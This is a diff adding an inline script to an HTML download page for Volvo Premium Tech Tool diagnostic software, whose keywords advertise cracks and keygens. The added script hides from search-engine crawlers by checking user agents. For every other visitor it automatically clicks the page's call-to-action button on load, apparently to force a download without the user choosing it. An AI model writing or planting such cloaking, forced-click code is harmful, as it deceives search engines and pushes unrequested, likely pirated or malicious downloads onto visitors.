@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Volvo Premium Tech Tool PTT 2.8.270 + 0.7 APCI 2024 + DevTool</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the latest Volvo Premium Tech Tool PTT 2.8.270 with APCI 2024 and DevTool, the ultimate diagnostic software for Volvo trucks and buses.">
     <meta name="keywords" content="Volvo Premium Tech Tool, Volvo PTT 2.8.270, Volvo APCI 2024, Volvo DevTool, Volvo diagnostic software, Volvo diagnostic software download, Volvo diagnostic software free download, PTT 2.8.270 download, PTT 2.8.270 free download, Volvo Tech Tool 2.8.270, Volvo Tech Tool 2024, Volvo diagnostic tools, Volvo PTT August 2024, Volvo PTT latest version, Volvo diagnostic solution, Volvo truck diagnostic software, Volvo bus diagnostic software, Volvo PTT crack, Volvo PTT keygen, Volvo Tech Tool keygen, Вольво диагностическое программное обеспечение, Вольво скачать диагностическое программное обеспечение, Вольво Tech Tool скачать, Вольво PTT последняя версия, скачать PTT 2.8.270, Volvo дианостическое программное обеспечение скачать бесплатно, Volvo PTT диагностический софт, Volvo Tech Tool диагностика">
     <style>
